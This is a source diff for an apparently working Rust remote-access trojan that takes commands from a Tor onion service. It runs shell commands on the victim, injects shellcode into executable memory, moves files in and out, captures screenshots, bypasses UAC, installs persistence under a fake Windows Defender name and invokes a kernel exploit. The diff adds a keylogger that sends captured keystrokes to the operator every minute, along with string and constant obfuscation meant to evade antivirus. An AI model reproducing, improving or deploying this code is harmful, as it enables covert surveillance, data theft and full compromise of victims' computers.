@@ -6,11 +6,13 @@ pub mod obfuscate;
 #[cfg(target_os = "windows")]
 mod uac_cmstp;
 #[cfg(target_os = "windows")]
-pub mod uac_bypass;
-#[cfg(target_os = "windows")]
-mod amsi_patch;
-pub mod persist;
-pub mod portscanner;
+mod uac_bypass;
+mod persist;
+mod portscanner;
+pub mod util;
+#[cfg(feature = "shared-lib")]
+mod exports;
+use goldberg::goldberg_stmts;
 #[cfg(target_os = "windows")]
 use is_elevated::is_elevated;
 #[cfg(target_os = "windows")]
@@ -62,7 +64,7 @@ impl Default for ClientConfig {
     fn default() -> Self {
         Self {
             onion: get_onion_host(),
-            port: 1337,
+            port: goldberg::goldberg_int!(1337),
         }
     }
 }
@@ -71,7 +73,7 @@ async fn init_tor() -> Result<TorClient<PreferredRuntime>> {
     let config = TorClientConfigBuilder::new()
         .build()?;
     let client = TorClient::create_bootstrapped(config).await?;
-    println!("Initialized Tor Client");
+    println!("{}", cryptify::encrypt_string!("Initialized Tor Client"));
     Ok(client)
 }
 
@@ -102,37 +104,47 @@ const RESPONSE_DELIM: &str = "\n>> ";
 fn get_hostname() -> String {
     gethostname()
         .into_string()
-        .unwrap_or_else(|_| "unknown".into())
+        .unwrap_or_else(|_| cryptify::encrypt_string!("unknown").into())
 }
 
 #[cfg(target_os = "windows")]
 fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
     unsafe {
-        let kernel32 = obfuscate::get_module_base(b"kernel32.dll\0");
+        use std::ffi::CString;
+        let kernel32 = winapi::um::libloaderapi::GetModuleHandleA(
+            CString::new(cryptify::encrypt_string!("kernel32.dll")).unwrap().as_ptr(),
+        );
         if kernel32.is_null() {
-            return Err(anyhow!("kernel32.dll not found"));
+            return Err(anyhow!(cryptify::encrypt_string!("kernel32.dll not found")));
         }
 
-        let hash_va = 0x382c0f97u32; // DJB2("VirtualAlloc")
-        let hash_ct = 0x7f08f451u32; // DJB2("CreateThread")
-        let hash_ch = 0x3870ca07u32; // DJB2("CloseHandle")
-        let hash_vf = 0x668fcf2eu32; // DJB2("VirtualFree")
-
-        let virtual_alloc = obfuscate::resolve_by_hash(kernel32, hash_va);
+        let virtual_alloc = winapi::um::libloaderapi::GetProcAddress(
+            kernel32,
+            CString::new(cryptify::encrypt_string!("VirtualAlloc")).unwrap().as_ptr(),
+        );
         if virtual_alloc.is_null() {
-            return Err(anyhow!("resolve VirtualAlloc failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualAlloc failed")));
         }
-        let create_thread = obfuscate::resolve_by_hash(kernel32, hash_ct);
+        let create_thread = winapi::um::libloaderapi::GetProcAddress(
+            kernel32,
+            CString::new(cryptify::encrypt_string!("CreateThread")).unwrap().as_ptr(),
+        );
         if create_thread.is_null() {
-            return Err(anyhow!("resolve CreateThread failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("resolve CreateThread failed")));
         }
-        let close_handle = obfuscate::resolve_by_hash(kernel32, hash_ch);
+        let close_handle = winapi::um::libloaderapi::GetProcAddress(
+            kernel32,
+            CString::new(cryptify::encrypt_string!("CloseHandle")).unwrap().as_ptr(),
+        );
         if close_handle.is_null() {
-            return Err(anyhow!("resolve CloseHandle failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("resolve CloseHandle failed")));
         }
-        let virtual_free = obfuscate::resolve_by_hash(kernel32, hash_vf);
+        let virtual_free = winapi::um::libloaderapi::GetProcAddress(
+            kernel32,
+            CString::new(cryptify::encrypt_string!("VirtualFree")).unwrap().as_ptr(),
+        );
         if virtual_free.is_null() {
-            return Err(anyhow!("resolve VirtualFree failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("resolve VirtualFree failed")));
         }
 
         type VirtualAllocFn = unsafe extern "system" fn(*mut u8, usize, u32, u32) -> *mut u8;
@@ -145,24 +157,20 @@ fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
         let close_handle: CloseHandleFn = std::mem::transmute(close_handle);
         let _virtual_free: VirtualFreeFn = std::mem::transmute(virtual_free);
 
-        const MEM_COMMIT: u32 = 0x1000;
-        const MEM_RESERVE: u32 = 0x2000;
-        const PAGE_EXECUTE_READWRITE: u32 = 0x40;
-
-        let ptr = virtual_alloc(
+        let ptr = (virtual_alloc)(
             std::ptr::null_mut(),
             data.len(),
-            MEM_COMMIT | MEM_RESERVE,
-            PAGE_EXECUTE_READWRITE,
+            goldberg::goldberg_int!(0x3000u32),
+            goldberg::goldberg_int!(0x40u32),
         );
         if ptr.is_null() {
-            return Err(anyhow!("VirtualAlloc failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("VirtualAlloc failed")));
         }
 
         std::ptr::copy_nonoverlapping(data.as_ptr(), ptr as *mut u8, data.len());
 
         let shellcode_fn: unsafe extern "system" fn(*mut u8) -> u32 = std::mem::transmute(ptr);
-        let thread = create_thread(
+        let thread = (create_thread)(
             std::ptr::null_mut(),
             0,
             Some(shellcode_fn),
@@ -171,9 +179,9 @@ fn execute_shellcode_windows(data: &[u8]) -> Result<()> {
             std::ptr::null_mut(),
         );
         if thread.is_null() {
-            return Err(anyhow!("CreateThread failed"));
+            return Err(anyhow!(cryptify::encrypt_string!("CreateThread failed")));
         }
-        close_handle(thread);
+        (close_handle)(thread);
     }
     Ok(())
 }
@@ -215,7 +223,7 @@ pub async fn run_command(input: &str) -> Result<Vec<u8>> {
     obfuscate::sleep_jitter_default();
     let mut parts = input.trim().split_whitespace();
 
-    let cmd = parts.next().ok_or_else(|| anyhow!("Empty command"))?;
+    let cmd = parts.next().ok_or_else(|| anyhow!(cryptify::encrypt_string!("Empty command")))?;
     let args: Vec<&str> = parts.collect();
 
     match cmd {
@@ -234,6 +242,8 @@ Available commands:
     `check_elevated`=>\tCheck if running with elevated privileges
     `self_uac`=>\tRun UAC bypass on self
     `portscan <tcp|udp|sctp> <host> [--fast]`=>\tPort scan target host
+    `keylogger_start`=>\tStart keylogger (auto-dumps every 60s)
+    `keylogger_stop`=>\tStop keylogger
 
     ").into_bytes())
         }
@@ -241,23 +251,24 @@ Available commands:
             obfuscate::sleep_jitter_default();
             #[cfg(target_os = "android")]
             let encoded = {
-                let output = std::process::Command::new("screencap")
-                    .arg("-p")
+                let output = std::process::Command::new(cryptify::encrypt_string!("screencap"))
+                    .arg(cryptify::encrypt_string!("-p"))
                     .output()
-                    .context("Failed to run screencap")?;
+                    .context(cryptify::encrypt_string!("Failed to run screencap"))?;
                 general_purpose::STANDARD.encode(&output.stdout)
             };
             #[cfg(not(target_os = "android"))]
             let encoded = take_screenshot_base64()?;
 
-            let filename = args.get(0).filter(|s| !s.is_empty()).cloned().unwrap_or("screenshot.png");
+            let default_filename = cryptify::encrypt_string!("screenshot.png");
+            let filename = args.get(goldberg::goldberg_int!(0)).filter(|s| !s.is_empty()).copied().unwrap_or(&default_filename);
             Ok(format!("[file] {} {}", filename, encoded).into_bytes())
         }
         "upload" => {
             obfuscate::sleep_jitter_default();
             let input_filename = args
-                .get(0)
-                .ok_or_else(|| anyhow!("upload: missing filename"))?;
+                .get(goldberg::goldberg_int!(0))
+                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("upload: missing filename")))?;
 
             let path = Path::new(input_filename);
 
@@ -266,13 +277,13 @@ Available commands:
             let filename = path
                 .file_name()
                 .and_then(|f| f.to_str())
-                .ok_or_else(|| anyhow!("invalid filename"))?;
+                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("invalid filename")))?;
             let encoded = general_purpose::STANDARD.encode(&data);
 
             let mut output = format!("[file-start] {}\n", filename);
             for chunk in encoded.as_bytes().chunks(16384) {
                 let chunk_str = std::str::from_utf8(chunk).unwrap();
-                output.push_str("[file-chunk] ");
+                output.push_str(&cryptify::encrypt_string!("[file-chunk] "));
                 output.push_str(chunk_str);
                 output.push('\n');
             }
@@ -282,12 +293,12 @@ Available commands:
         "download" | "[file][" => {
             obfuscate::sleep_jitter_default();
             let input_filename = args
-                .get(0)
-                .ok_or_else(|| anyhow!("download: missing filename"))?;
+                .get(goldberg::goldberg_int!(0))
+                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing filename")))?;
 
             let encoded = args
-                .get(1)
-                .ok_or_else(|| anyhow!("download: missing data"))?;
+                .get(goldberg::goldberg_int!(1))
+                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("download: missing data")))?;
 
             let data = general_purpose::STANDARD.decode(encoded)?;
 
@@ -299,7 +310,7 @@ Available commands:
         }
         "cd" => {
             obfuscate::sleep_jitter_default();
-            let target = args.get(0).ok_or_else(|| anyhow!("cd: missing argument"))?;
+            let target = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("cd: missing argument")))?;
 
             match std::env::set_current_dir(target) {
                 Ok(_) => {
@@ -319,7 +330,7 @@ Available commands:
                     return Ok(b"uac: missing argument\n".to_vec());
                 }
 
-                let payload = args.join(" ");
+                let payload = args.join(cryptify::encrypt_string!(" "));
                 uac_bypass::uac_slui(&payload);
 
                 Ok(format!("Triggered UAC (slui) with payload: {}\n", payload).into_bytes())
@@ -333,7 +344,7 @@ Available commands:
 
         "persist" => {
             obfuscate::sleep_jitter_default();
-            let _ = persist::persist(false);
+            let _ = persist::persist();
             Ok(b"Persistence applied\n".to_vec())
         }
 
@@ -345,21 +356,21 @@ Available commands:
             };
             #[cfg(target_os = "windows")]
             let target_dir = {
-                let appdata = match std::env::var("APPDATA") {
+                let appdata = match std::env::var(cryptify::encrypt_string!("APPDATA")) {
                     Ok(d) => d,
                     Err(_) => return Ok(b"APPDATA not set\n".to_vec()),
                 };
-                Path::new(&appdata).join("WindowsDefender")
+                Path::new(&appdata).join(cryptify::encrypt_string!("WindowsDefender"))
             };
             #[cfg(not(target_os = "windows"))]
             let target_dir = {
-                let home = match std::env::var("HOME") {
+                let home = match std::env::var(cryptify::encrypt_string!("HOME")) {
                     Ok(d) => d,
                     Err(_) => return Ok(b"HOME not set\n".to_vec()),
                 };
-                Path::new(&home).join(".cache/defender")
+                Path::new(&home).join(cryptify::encrypt_string!(".cache/defender"))
             };
-            let target_path = target_dir.join("defender.exe");
+            let target_path = target_dir.join(cryptify::encrypt_string!("defender.exe"));
             if let Err(e) = std::fs::create_dir_all(&target_dir) {
                 return Ok(format!("Failed to create directory: {}\n", e).into_bytes());
             }
@@ -375,7 +386,7 @@ Available commands:
             std::process::Command::new(&target_path)
                 .spawn()
                 .ok();
-            std::process::exit(0);
+            std::process::exit(goldberg::goldberg_int!(0));
         }
 
         "check_elevated" => {
@@ -410,14 +421,14 @@ Available commands:
 
         "portscan" => {
             obfuscate::sleep_jitter_default();
-            let protocol = args.get(0).ok_or_else(|| anyhow!("portscan: missing protocol"))?.to_lowercase();
-            let host = args.get(1).ok_or_else(|| anyhow!("portscan: missing host"))?.to_string();
-            let fast = args.contains(&"--fast");
+            let protocol = args.get(goldberg::goldberg_int!(0)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing protocol")))?.to_lowercase();
+            let host = args.get(goldberg::goldberg_int!(1)).ok_or_else(|| anyhow!(cryptify::encrypt_string!("portscan: missing host")))?.to_string();
+            let fast = args.contains(&cryptify::encrypt_string!("--fast").as_str());
 
             let ports: Vec<u16> = if fast {
                 portscanner::COMMON_PORTS.to_vec()
             } else {
-                (1..=65535).collect()
+                (goldberg::goldberg_int!(1)..=goldberg::goldberg_int!(65535)).collect()
             };
 
             let total = ports.len();
@@ -431,7 +442,7 @@ Available commands:
                     #[cfg(unix)]
                     { portscanner::scan_sctp(&host, &ports).await }
                     #[cfg(not(unix))]
-                    { return Err(anyhow!("SCTP scan not supported on this OS")); }
+                    { return Err(anyhow!(cryptify::encrypt_string!("SCTP scan not supported on this OS"))); }
                 }
                 _ => return Err(anyhow!("portscan: unknown protocol '{}' (use tcp, udp, or sctp)", protocol)),
             };
@@ -449,8 +460,8 @@ Available commands:
         "shellcode" => {
             obfuscate::sleep_jitter_default();
             let b64_data = args
-                .get(0)
-                .ok_or_else(|| anyhow!("shellcode: missing base64 data"))?;
+                .get(goldberg::goldberg_int!(0))
+                .ok_or_else(|| anyhow!(cryptify::encrypt_string!("shellcode: missing base64 data")))?;
 
             let data = general_purpose::STANDARD.decode(b64_data)?;
 
@@ -465,17 +476,35 @@ Available commands:
             Ok(msg.into_bytes())
         }
 
+        "keylogger_start" => {
+            obfuscate::sleep_jitter_default();
+            if util::keylogger::is_running() {
+                Ok(b"Keylogger already running\n".to_vec())
+            } else {
+                util::keylogger::start();
+                Ok(b"Keylogger started\n".to_vec())
+            }
+        }
+        "keylogger_stop" => {
+            obfuscate::sleep_jitter_default();
+            if util::keylogger::is_running() {
+                util::keylogger::stop();
+                Ok(b"Keylogger stopped\n".to_vec())
+            } else {
+                Ok(b"Keylogger not running\n".to_vec())
+            }
+        }
         "exit" | "quit" | "/quit" => {
             obfuscate::sleep_jitter_default();
-            Ok("Goodbye\n".into())
+            Ok(cryptify::encrypt_string!("Goodbye\n").as_bytes().to_vec())
         }
 
-        _ => {
+        _ => goldberg_stmts!({
             obfuscate::sleep_jitter_default();
             #[cfg(target_os = "windows")]
             let mut command = {
-                let mut c = Command::new("cmd.exe");
-                c.arg("/C")
+                let mut c = Command::new(cryptify::encrypt_string!("cmd.exe"));
+                c.arg(cryptify::encrypt_string!("/C"))
                     .arg(input)
                     .creation_flags(CREATE_NO_WINDOW);
                 c
@@ -483,20 +512,20 @@ Available commands:
 
             #[cfg(target_os = "linux")]
             let mut command = {
-                let mut c = Command::new("/bin/sh");
-                c.arg("-c").arg(input);
+                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
+                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                 c
             };
             #[cfg(target_os = "macos")]
             let mut command = {
-                let mut c = Command::new("/bin/sh");
-                c.arg("-c").arg(input);
+                let mut c = Command::new(cryptify::encrypt_string!("/bin/sh"));
+                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                 c
             };
             #[cfg(target_os = "android")]
             let mut command = {
-                let mut c = Command::new("/system/bin/sh");
-                c.arg("-c").arg(input);
+                let mut c = Command::new(cryptify::encrypt_string!("/system/bin/sh"));
+                c.arg(cryptify::encrypt_string!("-c")).arg(input);
                 c
             };
 
@@ -517,7 +546,7 @@ Available commands:
             }
 
             Ok(result)
-        }
+        })
     }
 }
 
@@ -544,13 +573,27 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
     writer.write_all(b"\n>> ").await?;
     writer.flush().await?;
 
+    let mut keylog_timer = tokio::time::interval(Duration::from_secs(goldberg::goldberg_int!(60)));
+    keylog_timer.tick().await;
+
     loop {
         tokio::select! {
+            _ = keylog_timer.tick() => {
+                if util::keylogger::is_running() {
+                    let keys = util::keylogger::dump_and_clear();
+                    if !keys.is_empty() {
+                        let encoded = general_purpose::STANDARD.encode(keys.as_bytes());
+                        let msg = format!("[keylog] {}\n", encoded);
+                        let _ = writer.write_all(msg.as_bytes()).await;
+                        let _ = writer.flush().await;
+                    }
+                }
+            }
             result = reader.read(&mut buf) => {
                 let n = result?;
 
                 if n == 0 {
-                    println!("Connection closed by remote");
+                    println!("{}", cryptify::encrypt_string!("Connection closed by remote"));
                     return Ok(false);
                 }
 
@@ -562,22 +605,22 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
 
                     line = line.trim().to_string();
 
-                    if line.starts_with("download-start ") {
-                        let parts: Vec<&str> = line.splitn(2, ' ').collect();
-                        dl_filename = Some(parts.get(1).unwrap_or(&"unknown").to_string());
+                    if line.starts_with(&cryptify::encrypt_string!("download-start ")) {
+                        let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
+                        dl_filename = Some(parts.get(goldberg::goldberg_int!(1)).copied().unwrap_or(&cryptify::encrypt_string!("unknown")).to_string());
                         dl_data.clear();
                         continue;
                     }
 
                     if dl_filename.is_some() {
-                        if line.starts_with("download-chunk ") {
-                            let parts: Vec<&str> = line.splitn(2, ' ').collect();
-                            if let Some(chunk) = parts.get(1) {
+                        if line.starts_with(&cryptify::encrypt_string!("download-chunk ")) {
+                            let parts: Vec<&str> = line.splitn(goldberg::goldberg_int!(2), ' ').collect();
+                            if let Some(chunk) = parts.get(goldberg::goldberg_int!(1)) {
                                 dl_data.push_str(chunk);
                             }
                             continue;
                         }
-                        if line == "download-end" {
+                        if line == cryptify::encrypt_string!("download-end") {
                             let fname = dl_filename.take().unwrap();
                             let raw = general_purpose::STANDARD.decode(&dl_data)?;
                             fs::write(&fname, &raw)?;
@@ -597,7 +640,7 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
                         continue;
                     }
 
-                    if line == "exit" || line == "quit" || line == "/quit" {
+                    if line == cryptify::encrypt_string!("exit") || line == cryptify::encrypt_string!("quit") || line == cryptify::encrypt_string!("/quit") {
                         writer.write_all(b"Goodbye\n").await?;
                         writer.flush().await?;
                         return Ok(true);
@@ -620,25 +663,31 @@ pub async fn read_loop(stream: DataStream) -> Result<bool> {
         }
     }
 }
-
+fn rand_range(min: u64, max: u64) -> u64 {
+    let nanos = std::time::SystemTime::now()
+        .duration_since(std::time::UNIX_EPOCH)
+        .unwrap_or_default()
+        .as_nanos();
+    min + (nanos as u64) % (max - min + 1)
+}
 /// Core runner
 pub async fn netclient_run(config: ClientConfig) -> Result<()> {
     loop {
-        println!("Attempting to connect...");
+        println!("{}", cryptify::encrypt_string!("Attempting to connect..."));
 
         let tor_client = init_tor().await?;
 
         match connect_onion(&tor_client, &config.onion, config.port).await {
             Ok(stream) => {
-                println!("Connected to onion service");
+                println!("{}", cryptify::encrypt_string!("Connected to onion service"));
 
                 match read_loop(stream).await {
                     Ok(true) => {
-                        println!("Exit requested");
+                        println!("{}", cryptify::encrypt_string!("Exit requested"));
                         break;
                     }
                     Ok(false) => {
-                        println!("Connection closed");
+                        println!("{}", cryptify::encrypt_string!("Connection closed"));
                     }
                     Err(e) => {
                         println!("Session error: {}", e);
@@ -649,50 +698,46 @@ pub async fn netclient_run(config: ClientConfig) -> Result<()> {
                 println!("Connection failed: {}", e);
             }
         }
-        let delay = rand_range(13, 121);
+        let delay = rand_range(goldberg::goldberg_int!(13), goldberg::goldberg_int!(121));
         println!("Reconnecting in {} seconds...", delay);
         sleep(Duration::from_secs(delay)).await;
     }
     Ok(())
 }
 
-fn rand_range(min: u64, max: u64) -> u64 {
-    let nanos = std::time::SystemTime::now()
-        .duration_since(std::time::UNIX_EPOCH)
-        .unwrap_or_default()
-        .as_nanos();
-    min + (nanos as u64) % (max - min + 1)
+
+async fn netclient_impl() -> c_int {
+    goldberg_stmts!({
+        #[cfg(target_os = "windows")]
+        {
+            unsafe { kernel_exploit::exploit(); }
+        }
+        cryptify::flow_stmt!();
+        let exe: String = std::env::current_exe().unwrap().display().to_string();
+        obfuscate::sleep_jitter_default();
+        cryptify::flow_stmt!();
+        obfuscate::sleep_jitter_default();
+        cryptify::flow_stmt!();
+        #[cfg(target_os = "windows")]
+        {
+            uac_cmstp::execute(&exe);
+        }
+        obfuscate::sleep_jitter_default();
+        cryptify::flow_stmt!();
+        let _ = persist::persist();
+        obfuscate::sleep_jitter_default();
+        cryptify::flow_stmt!();
+        let _ = netclient_run(ClientConfig::default()).await;
+        0
+    })
+}
+pub async fn netclient() -> c_int {
+    netclient_impl().await;
+    0
 }
 
-#[unsafe(no_mangle)]
-async fn netclient_impl() -> c_int {
-    #[cfg(target_os = "windows")]
-    amsi_patch::amsi_patch();
-    obfuscate::sleep_jitter_default();
-    #[cfg(target_os = "windows")]
-    unsafe {
-        kernel_exploit::exploit();
-    }
-    #[cfg(target_os = "windows")]
-    let exe = env::current_exe().unwrap().display().to_string();
-    obfuscate::sleep_jitter_default();
-    #[cfg(target_os = "windows")]
-    uac_cmstp::execute(&exe);
-    obfuscate::sleep_jitter_default();
-    
-    #[cfg(target_os = "windows")]
-    use is_elevated;
-    #[cfg(target_os = "windows")]
-    if is_elevated::is_elevated(){
-        println!("Elevated")    
-    }
-    let _ = netclient_run(ClientConfig::default()).await;
-    return 0;
-}
-#[unsafe(export_name = "netclient")]
-pub extern "C" fn netclient() -> c_int {
-    obfuscate::sleep_jitter_default();
-    let _ = netclient_impl();
-    obfuscate::sleep_jitter_default();
-    return 0;
+#[cfg(feature = "shared-lib")]
+pub async fn netclient_dll() -> c_int {
+    netclient_impl().await;
+    0
 }
